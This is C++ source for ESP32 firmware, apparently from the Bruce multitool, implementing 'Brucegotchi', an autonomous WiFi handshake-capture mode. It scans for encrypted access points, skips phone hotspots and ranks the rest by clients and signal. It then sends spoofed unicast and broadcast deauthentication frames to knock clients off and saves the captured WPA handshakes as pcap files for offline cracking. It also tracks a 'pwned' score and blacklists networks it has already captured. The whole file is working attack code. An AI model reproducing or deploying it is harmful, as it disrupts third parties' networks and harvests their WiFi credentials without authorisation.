#include "brucegotchi.h"
#include "core/display.h"
#include "core/led_control.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "sniffer.h"
#include "wifi_atks.h"
#include <Arduino.h>
#include <LittleFS.h>
#include <Preferences.h>
#include <SD.h>
#include <algorithm>
#include <esp_log.h>
#include <esp_wifi.h>
#include <map>
#include <set>
#include <vector>

extern uint8_t targetBssid[6];
extern Preferences prefs;

struct TargetAP {
    String ssid;
    uint8_t bssid[6];
    uint8_t channel;
    int32_t rssi;
    int authmode;
    bool has_clients = false;
};

static constexpr uint32_t BRUCE_MAX_CPU_MHZ = 240;
static TaskHandle_t brucegotchiTaskHandle = nullptr;
static bool serialMuted = false;
static esp_log_level_t prevLogLevel = ESP_LOG_INFO;

static void setMaxPerfMode(bool enable) {
    if (enable) {
        setCpuFrequencyMhz(BRUCE_MAX_CPU_MHZ);
        esp_wifi_set_ps(WIFI_PS_NONE);
        WiFi.setSleep(false);
    } else {
        esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
        WiFi.setSleep(true);
        setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
    }
}

static void setLogMute(bool enable) {
    if (enable == serialMuted) return;
    serialMuted = enable;

    if (enable) {
        prevLogLevel = esp_log_level_get("*");
        esp_log_level_set("*", ESP_LOG_NONE);
        Serial.flush();
        Serial.end();
    } else {
        Serial.begin(115200);
        esp_log_level_set("*", prevLogLevel);
    }
}

struct LogMuteGuard {
    LogMuteGuard() { setLogMute(true); }
    ~LogMuteGuard() { setLogMute(false); }
};

static uint64_t getMacKey(const uint8_t *mac) {
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) { key = (key << 8) | (uint64_t)mac[i]; }
    return key;
}

static String macKeyToHex(uint64_t key) {
    uint8_t mac[6];
    for (int i = 5; i >= 0; --i) {
        mac[i] = (uint8_t)(key & 0xFF);
        key >>= 8;
    }
    char buf[13];
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static uint64_t hexToMacKey(const String &hex) {
    if (hex.length() != 12) return 0;
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) {
        char byteStr[3];
        byteStr[0] = hex[2 * i];
        byteStr[1] = hex[2 * i + 1];
        byteStr[2] = '\0';
        uint8_t b = (uint8_t)strtol(byteStr, nullptr, 16);
        key = (key << 8) | (uint64_t)b;
    }
    return key;
}

static std::set<uint64_t> blacklistedBssids;
static std::map<uint64_t, int> sessionAttempts;
static std::map<uint64_t, bool> sessionHasClients;

static void loadBlacklist() {
    blacklistedBssids.clear();
    String list = prefs.getString("bl_mac", "");
    if (list.length() == 0) return;

    int start = 0;
    while (start < list.length()) {
        int comma = list.indexOf(',', start);
        if (comma == -1) comma = list.length();
        String token = list.substring(start, comma);
        token.trim();
        token.toUpperCase();
        if (token.length() == 12) {
            uint64_t key = hexToMacKey(token);
            if (key != 0) { blacklistedBssids.insert(key); }
        }
        start = comma + 1;
    }
}

static void saveBlacklist() {
    if (blacklistedBssids.empty()) {
        prefs.putString("bl_mac", "");
        return;
    }
    String out = "";
    bool first = true;
    for (auto key : blacklistedBssids) {
        if (!first) out += ",";
        out += macKeyToHex(key);
        first = false;
    }
    prefs.putString("bl_mac", out);
}

void setMood(String face, String text);
bool isSmartphone(String ssid);

static float getStorageFreePercent(FS *fs) {
    (void)fs;
    uint64_t total = 0;
    uint64_t used = 0;
    if (isLittleFS) {
        total = LittleFS.totalBytes();
        used = LittleFS.usedBytes();
    } else {
        total = SD.totalBytes();
        used = SD.usedBytes();
    }
    if (total == 0) return 0.0f;
    if (used > total) used = total;
    uint64_t freeBytes = total - used;
    double pct = (static_cast<double>(freeBytes) * 100.0) / static_cast<double>(total);
    return static_cast<float>(pct);
}

static bool deleteOldestLogFile(FS *fs) {
    if (!fs) return false;
    char logsDir[32];
    snprintf(logsDir, sizeof(logsDir), "/BrucePCAP/logs");
    if (!fs->exists(logsDir)) return false;

    File dir = fs->open(logsDir);
    if (!dir) return false;

    bool found = false;
    time_t oldestTime = 0;
    String oldestPath = "";

    while (true) {
        File f = dir.openNextFile();
        if (!f) break;
        if (f.isDirectory()) {
            f.close();
            continue;
        }
        time_t ts = f.getLastWrite();
        String name = f.name();
        f.close();

        if (!found) {
            found = true;
            oldestTime = ts;
            oldestPath = name;
            continue;
        }

        if ((ts != 0 && (oldestTime == 0 || ts < oldestTime)) || (ts == oldestTime && name < oldestPath)) {
            oldestTime = ts;
            oldestPath = name;
        }
    }
    dir.close();

    if (!found || oldestPath.length() == 0) return false;

    char fullPath[128];
    if (oldestPath[0] == '/') {
        snprintf(fullPath, sizeof(fullPath), "%s", oldestPath.c_str());
    } else {
        snprintf(fullPath, sizeof(fullPath), "%s/%s", logsDir, oldestPath.c_str());
    }
    return fs->remove(fullPath);
}

static bool checkStorageSpace(FS *fs) {
    float freePct = getStorageFreePercent(fs);
    if (freePct >= 5.0f) return true;

    setMood("(-_-)", "Cleaning SD....");
    vTaskDelay(200 / portTICK_PERIOD_MS);

    int removed = 0;
    while (freePct < 5.0f) {
        if (!deleteOldestLogFile(fs)) break;
        removed++;
        freePct = getStorageFreePercent(fs);
        vTaskDelay(50 / portTICK_PERIOD_MS);
        if (removed > 100) break;
    }

    if (freePct < 5.0f) {
        setMood("(o_o)", "Low Space!");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return false;
    }
    return true;
}

static std::vector<TargetAP> get_targets_for_bruce() {
    int nets = WiFi.scanNetworks(false, true);
    std::vector<TargetAP> targets;
    targets.reserve(nets > 0 ? (size_t)nets : 0);

    for (int i = 0; i < nets; i++) {
        if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN) {
            if (isSmartphone(WiFi.SSID(i))) {
                Serial.printf("[Brucegotchi] Filtered out mobile hotspot: %s\n", WiFi.SSID(i).c_str());
                continue;
            }

            TargetAP ap;
            ap.ssid = WiFi.SSID(i);
            memcpy(ap.bssid, WiFi.BSSID(i), 6);
            ap.channel = WiFi.channel(i);
            ap.rssi = WiFi.RSSI(i);
            ap.has_clients = false;

            uint64_t key = getMacKey(ap.bssid);
            auto it = sessionHasClients.find(key);
            if (it != sessionHasClients.end()) {
                ap.has_clients = it->second;
            }

            targets.push_back(ap);
        }
    }

    if (targets.empty()) {
        Serial.println("[Brucegotchi] Targets found: 0");
        return targets;
    }

    Serial.printf("[Brucegotchi] Targets found: %d\n", (int)targets.size());
    for (size_t i = 0; i < targets.size(); ++i) {
        const TargetAP &t = targets[i];
        char macBuf[18];
        snprintf(
            macBuf,
            sizeof(macBuf),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            t.bssid[0],
            t.bssid[1],
            t.bssid[2],
            t.bssid[3],
            t.bssid[4],
            t.bssid[5]
        );
        uint64_t key = getMacKey(t.bssid);
        bool attempted = sessionAttempts.find(key) != sessionAttempts.end();
        Serial.printf(
            "  #%d SSID=\"%s\" BSSID=%s RSSI=%d has_clients=%d attempted=%d\n",
            (int)(i + 1),
            t.ssid.c_str(),
            macBuf,
            (int)t.rssi,
            t.has_clients ? 1 : 0,
            attempted ? 1 : 0
        );
    }

    std::sort(targets.begin(), targets.end(), [](const TargetAP &a, const TargetAP &b) {
        uint64_t keyA = getMacKey(a.bssid);
        uint64_t keyB = getMacKey(b.bssid);
        bool attemptedA = sessionAttempts.find(keyA) != sessionAttempts.end();
        bool attemptedB = sessionAttempts.find(keyB) != sessionAttempts.end();

        if (attemptedA != attemptedB) return !attemptedA;
        if (a.has_clients != b.has_clients) return a.has_clients;
        return a.rssi > b.rssi;
    });

    Serial.println("[Brucegotchi] Priority order:");
    for (size_t i = 0; i < targets.size(); ++i) {
        const TargetAP &t = targets[i];
        char macBuf[18];
        snprintf(
            macBuf,
            sizeof(macBuf),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            t.bssid[0],
            t.bssid[1],
            t.bssid[2],
            t.bssid[3],
            t.bssid[4],
            t.bssid[5]
        );
        uint64_t key = getMacKey(t.bssid);
        bool attempted = sessionAttempts.find(key) != sessionAttempts.end();
        Serial.printf(
            "  #%d SSID=\"%s\" BSSID=%s RSSI=%d has_clients=%d%s\n",
            (int)(i + 1),
            t.ssid.c_str(),
            macBuf,
            (int)t.rssi,
            t.has_clients ? 1 : 0,
            attempted ? " [attempted penalty]" : ""
        );
    }

    bool printedPenaltyHeader = false;
    for (size_t i = 0; i < targets.size(); ++i) {
        const TargetAP &t = targets[i];
        uint64_t key = getMacKey(t.bssid);
        if (sessionAttempts.find(key) == sessionAttempts.end()) continue;
        if (!printedPenaltyHeader) {
            Serial.println("[Brucegotchi] Attempted penalty targets (pushed to tail):");
            printedPenaltyHeader = true;
        }
        char macBuf[18];
        snprintf(
            macBuf,
            sizeof(macBuf),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            t.bssid[0],
            t.bssid[1],
            t.bssid[2],
            t.bssid[3],
            t.bssid[4],
            t.bssid[5]
        );
        Serial.printf("  SSID=\"%s\" BSSID=%s\n", t.ssid.c_str(), macBuf);
    }

    const TargetAP &top = targets.front();
    const char *reason = top.has_clients ? "has_clients" : "best RSSI";
    char topMac[18];
    snprintf(
        topMac,
        sizeof(topMac),
        "%02X:%02X:%02X:%02X:%02X:%02X",
        top.bssid[0],
        top.bssid[1],
        top.bssid[2],
        top.bssid[3],
        top.bssid[4],
        top.bssid[5]
    );
    Serial.printf(
        "[Brucegotchi] Priority #1: SSID=\"%s\" BSSID=%s (%s)\n",
        top.ssid.c_str(),
        topMac,
        reason
    );

    return targets;
}

// --- ФИЛЬТР СМАРТФОНОВ ---
bool isSmartphone(String ssid) {
    String s = ssid;
    s.toLowerCase();
    if (s.indexOf("iphone") >= 0 || s.indexOf("android") >= 0 || s.indexOf("galaxy") >= 0 ||
        s.indexOf("redmi") >= 0 || s.indexOf("poco") >= 0 || s.indexOf("pixel") >= 0 ||
        s.indexOf("vivo") >= 0 || s.indexOf("oppo") >= 0 || s.indexOf("realme") >= 0 ||
        s.indexOf("huawei") >= 0 || s.indexOf("honor") >= 0 || s.indexOf("macbook") >= 0 ||
        s.indexOf("ipad") >= 0 || s.indexOf("hotspot") >= 0 || s.indexOf("tethering") >= 0 ||
        s.indexOf("oneplus") >= 0 || s.indexOf("zte") >= 0 || s.indexOf("tecno") >= 0 ||
        s.indexOf("infinix") >= 0) {
        return true;
    }
    return false;
}

Preferences prefs;
uint32_t total_pwned = 0;
uint32_t session_captured = 0;
bool show_stats = false;

// ПЕРЕМЕННЫЕ ЭКРАНА
String current_face = "(O_O)";
String current_text = "Waking up...";
String current_target = ""; // Выделенная переменная для цели

void drawCurrentMood() {
    tft.drawPixel(0, 0, 0);
    drawMainBorderWithTitle("Brucegotchi", true);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    if (show_stats) {
        int level = (total_pwned / 5) + 1;
        tft.setTextSize(3);
        tft.setCursor(20, 40);
        tft.printf("Level: %d", level);

        tft.setTextSize(2);
        tft.setCursor(20, 90);
        tft.printf("Total Pwned: %d", total_pwned);
        tft.setCursor(20, 120);
        tft.printf("Session Pwns: %d", session_captured);

        uint32_t up = millis() / 1000;
        tft.setCursor(20, 150);
        tft.printf("Uptime: %02dm %02ds", (up % 3600) / 60, up % 60);

        tft.setTextSize(1);
        tft.setCursor(10, tftHeight - 20);
        tft.print("Tap screen to return to Pet");
    } else {
        // --- ОТРИСОВКА ЦЕЛИ (НАВЕРХУ) ---
        if (current_target != "") {
            tft.setTextSize(2);
            String tgt_str = "Tgt: " + current_target;
            // Обрезаем слишком длинные имена, чтобы не ломать экран
            if (tgt_str.length() > 24) tgt_str = tgt_str.substring(0, 21) + "...";

            int tgtWidth = tgt_str.length() * 12;
            tft.setCursor((tftWidth - tgtWidth) / 2, 40);
            tft.print(tgt_str);
        }

        // --- МОРДОЧКА (В ЦЕНТРЕ) ---
        tft.setTextSize(3);
        int faceWidth = current_face.length() * 18;
        tft.setCursor((tftWidth - faceWidth) / 2, tftHeight / 2 - 20);
        tft.print(current_face);

        // --- СТАТУС (ПОД МОРДОЧКОЙ) ---
        tft.setTextSize(2);
        int textWidth = current_text.length() * 12;
        tft.setCursor((tftWidth - textWidth) / 2, tftHeight / 2 + 30);
        tft.print(current_text);

        // --- СЧЕТЧИК И УРОВЕНЬ (ВНИЗУ) ---
        tft.setTextSize(1);
        tft.setCursor(10, tftHeight - 20);
        tft.printf("Lvl: %d | Pwned: %d", (total_pwned / 5) + 1, session_captured);
    }
}

void setMood(String face, String text) {
    current_face = face;
    current_text = text;
    Serial.printf(
        "[Brucegotchi] [DISPLAY] %s | %s | Pwns: %u\n", face.c_str(), text.c_str(), session_captured
    );
    drawCurrentMood();
}

bool checkInput() {
    if (check(EscPress)) return true;
    if (check(SelPress)) {
        show_stats = !show_stats;
        drawCurrentMood();
        vTaskDelay(300 / portTICK_PERIOD_MS);
    }
    return false;
}

bool smartDelay(uint32_t ms) {
    uint32_t start = millis();
    while (millis() - start < ms) {
        if (checkInput()) return true;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
    return false;
}

static void brucegotchi_run() {
    Serial.println("\n[Brucegotchi] === STARTING DESKTOP SNIPER v4.0 (1.5 Min, 30s Deauth) ===\n");
    setMaxPerfMode(true);

    prefs.begin("brucegotchi", false);
    total_pwned = prefs.getUInt("pwned", 0);
    loadBlacklist();
    session_captured = 0;
    show_stats = false;
    current_target = "";
    sessionAttempts.clear();
    sessionHasClients.clear();
    int empty_scan_streak = 0;
    int missed_streak = 0;

    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        handshakeFs = &SD;
    } else {
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }

    if (!handshakeFs->exists("/BrucePCAP/handshakes")) {
        handshakeFs->mkdir("/BrucePCAP");
        handshakeFs->mkdir("/BrucePCAP/handshakes");
    }

    sniffer_prepare_storage(handshakeFs, !isLittleFS);
    sniffer_set_mode(SnifferMode::HandshakesOnly);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    beginLed();
    wakeUpScreen();

    while (true) {
        // --- РАЗВЕДКА ---
        current_target = "";
        setLedAttackMode(1, CRGB(255, 255, 0));
        setMood("(O_O)", "Scanning air...");

        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_MODE_STA);
        WiFi.disconnect();
        vTaskDelay(300 / portTICK_PERIOD_MS);

        std::vector<TargetAP> targets = get_targets_for_bruce();

        if (targets.empty()) {
            empty_scan_streak++;
            if (empty_scan_streak >= 3) {
                setMood("( -.-)zZ", "Sleeping...");
                turnOffDisplay();
            } else {
                setMood("(-_-)", "Air is empty...");
            }
            if (smartDelay(3000)) break;
            continue;
        } else {
            empty_scan_streak = 0;
        }

        // Есть цели — выводим экран из сна, если он был погашен
        wakeUpScreen();

        // --- ОХОТА ---
        bool manual_exit = false;
        for (auto &target : targets) {
            if (checkInput()) {
                manual_exit = true;
                break;
            }

            uint64_t targetKey = getMacKey(target.bssid);
            if (blacklistedBssids.find(targetKey) != blacklistedBssids.end()) {
                continue;
            }

            String safeSsid = sanitizeSsid(target.ssid.c_str());
            char hsFileName[128];
            snprintf(
                hsFileName,
                sizeof(hsFileName),
                "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
                target.bssid[0],
                target.bssid[1],
                target.bssid[2],
                target.bssid[3],
                target.bssid[4],
                target.bssid[5],
                safeSsid.c_str()
            );
            String hsFilePath = String(hsFileName);

            char unkFileName[128];
            snprintf(
                unkFileName,
                sizeof(unkFileName),
                "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_UNKNOWN.pcap",
                target.bssid[0],
                target.bssid[1],
                target.bssid[2],
                target.bssid[3],
                target.bssid[4],
                target.bssid[5]
            );
            String unkFilePath = String(unkFileName);

            if (handshakeFs->exists(hsFilePath)) continue;

            if (!checkStorageSpace(handshakeFs)) {
                if (smartDelay(1200)) {
                    manual_exit = true;
                    break;
                }
                continue;
            }

            sessionAttempts[targetKey]++;

            current_target = safeSsid;
            hsTracker = HandshakeTracker();

            BeaconList targetBeacon;
            memcpy(targetBeacon.MAC, target.bssid, 6);
            targetBeacon.channel = target.channel;
            registeredBeacons.clear();
            registeredBeacons.insert(targetBeacon);

            setHandshakeSniffer();
            portENTER_CRITICAL(&clientsMux);
            targetClients.clear();
            portEXIT_CRITICAL(&clientsMux);

            memcpy(targetBssid, target.bssid, 6);
            memcpy(ap_record.bssid, target.bssid, 6);
            ap_record.primary = target.channel;

            WiFi.mode(WIFI_MODE_APSTA);
            vTaskDelay(100 / portTICK_PERIOD_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(sniffer);
            esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(200 / portTICK_PERIOD_MS);

            // --- БЫСТРАЯ ОЦЕНКА (10 сек) ---
            setLedAttackMode(1, CRGB_Colors::Blue);
            setMood("(-_-)", "Watching...");

            uint32_t wait_start = millis();
            bool has_clients = false;
            while (millis() - wait_start < 10000) {
                if (checkInput()) {
                    manual_exit = true;
                    break;
                }
                portENTER_CRITICAL(&clientsMux);
                int num_clients = targetClients.size();
                portEXIT_CRITICAL(&clientsMux);
                if (num_clients > 0) {
                    has_clients = true;
                    break;
                }
                vTaskDelay(200 / portTICK_PERIOD_MS);
            }

            if (!manual_exit) {
                sessionHasClients[targetKey] = has_clients;
            }

            if (manual_exit) break;

            // --- ШТУРМ (90 сек = 1.5 МИНУТЫ) ---
            setMood("(>_<)", "Hunting 1.5m!");
            markHandshakeReady(getMacKey(target.bssid));

            LogMuteGuard muteLogs;
            uint32_t attack_start = millis();
            uint32_t last_deauth = 0;
            bool success = false;
            bool weak_signal = false;
            bool client_packets_seen = false;

            while (millis() - attack_start < 90000) {
                if (checkInput()) {
                    manual_exit = true;
                    break;
                }

                if (!client_packets_seen) {
                    portENTER_CRITICAL(&clientsMux);
                    for (const auto &kv : targetClients) {
                        if (kv.second.packets > 0) {
                            client_packets_seen = true;
                            break;
                        }
                    }
                    portEXIT_CRITICAL(&clientsMux);
                }
                if ((hsTracker.msg1 && hsTracker.msg2) || (hsTracker.msg3 && hsTracker.msg4)) {
                    success = true;
                    // Досрочный выход: как только поймали валидный хендшейк, выходим из цикла
                    break;
                }

                if (!client_packets_seen && target.rssi < -80 && (millis() - attack_start) >= 30000) {
                    weak_signal = true;
                    break;
                }
                // ДЕАУТ КАЖДЫЕ 30 СЕКУНД (10 пакетов)
                if (millis() - last_deauth > 30000) {
                    last_deauth = millis();
                    setLedAttackMode(3, CRGB_Colors::Red);

                    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                    wsl_bypasser_send_raw_frame(&ap_record, target.channel);

                    // Snapshot clients under lock (avoid holding mux during TX)
                    uint8_t client_macs[8][6];
                    size_t client_count = 0;
                    portENTER_CRITICAL(&clientsMux);
                    for (const auto &kv : targetClients) {
                        if (client_count >= (sizeof(client_macs) / sizeof(client_macs[0]))) break;
                        uint64_t key = kv.first;
                        for (int b = 5; b >= 0; --b) {
                            client_macs[client_count][b] = (uint8_t)(key & 0xFF);
                            key >>= 8;
                        }
                        client_count++;
                    }
                    portEXIT_CRITICAL(&clientsMux);

                    if (client_count > 0) {
                        for (size_t c = 0; c < client_count; ++c) {
                            // AP -> Client (unicast)
                            memcpy(&deauth_frame[4], client_macs[c], 6);
                            memcpy(&deauth_frame[10], target.bssid, 6);
                            memcpy(&deauth_frame[16], target.bssid, 6);
                            for (int i = 0; i < 4; i++) {
                                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                                vTaskDelay(2 / portTICK_PERIOD_MS);
                            }

                            // Client -> AP (spoofed)
                            memcpy(&deauth_frame[4], target.bssid, 6);
                            memcpy(&deauth_frame[10], client_macs[c], 6);
                            memcpy(&deauth_frame[16], target.bssid, 6);
                            for (int i = 0; i < 4; i++) {
                                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                                vTaskDelay(2 / portTICK_PERIOD_MS);
                            }
                        }
                    } else {
                        // Fallback: broadcast deauth
                        memcpy(&deauth_frame[10], target.bssid, 6);
                        memcpy(&deauth_frame[16], target.bssid, 6);
                        for (int i = 0; i < 10; i++) {
                            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                            vTaskDelay(10 / portTICK_PERIOD_MS);
                        }
                    }

                    setMood("(>_<)", "Pew Pew Pew!");
                    vTaskDelay(500 / portTICK_PERIOD_MS);

                    // Если уже поймали хендшейк, пусть диод мигает зеленым, иначе синим
                    if (success) setLedAttackMode(2, CRGB_Colors::Green);
                    else setLedAttackMode(1, CRGB_Colors::Blue);

                    setMood("(-_-)", "Listening...");
                }
                vTaskDelay(100 / portTICK_PERIOD_MS);
            }

            if (manual_exit) break;
            esp_wifi_set_promiscuous(false);
            sniffer_wait_for_flush(400);

            // --- ИТОГИ ---
            if (success) {
                missed_streak = 0;
                session_captured++;
                total_pwned++;
                prefs.putUInt("pwned", total_pwned);

                uint64_t key = getMacKey(target.bssid);
                if (blacklistedBssids.insert(key).second) {
                    saveBlacklist();
                }

                if (unkFilePath != hsFilePath && handshakeFs->exists(unkFilePath)) {
                    handshakeFs->rename(unkFilePath, hsFilePath);
                }

                if (hsTracker.msg1 && hsTracker.msg2 && hsTracker.msg3 && hsTracker.msg4) {
                    setMood("(^__^)", "Gotcha 4/4!");
                } else {
                    setMood("(^__^)", "Gotcha (Usable)");
                }

                setLedAttackMode(2, CRGB_Colors::Green);
                if (smartDelay(4000)) {
                    manual_exit = true;
                    break;
                }
            } else {
                if (weak_signal) {
                    setMood("(-_-)", "Weak Signal");
                } else {
                    missed_streak++;
                    if (missed_streak >= 3) setMood("( ಠ_ಠ)", "Angry!");
                    else setMood("(T_T)", "Missed...");
                }

                // Перед удалением даём снифферу гарантированно дописать и закрыть файл(ы)
                sniffer_wait_for_flush(400);
                vTaskDelay(500 / portTICK_PERIOD_MS);

                // УДАЛЯЕМ МУСОРНЫЕ ФАЙЛЫ НАПРЯМУЮ ПО ПУТЯМ
                if (handshakeFs->exists(hsFilePath)) {
                    handshakeFs->remove(hsFilePath);
                    SavedHS.erase(hsFilePath);
                }
                if (unkFilePath != hsFilePath && handshakeFs->exists(unkFilePath)) {
                    handshakeFs->remove(unkFilePath);
                    SavedHS.erase(unkFilePath);
                }

                if (smartDelay(2000)) {
                    manual_exit = true;
                    break;
                }
            }
        }
        if (manual_exit) break;
    }

    prefs.end();
    current_target = "";
    setLedAttackMode(0, CRGB_Colors::Black);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    setMaxPerfMode(false);
}

static void brucegotchi_task(void *parameter) {
    brucegotchi_run();
    brucegotchiTaskHandle = nullptr;
    vTaskDelete(NULL);
}

void brucegotchi_start() {
    if (brucegotchiTaskHandle) return;
    xTaskCreatePinnedToCore(
        brucegotchi_task,
        "brucegotchi",
        8192,
        nullptr,
        8,
        &brucegotchiTaskHandle,
        1
    );
    while (brucegotchiTaskHandle) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}
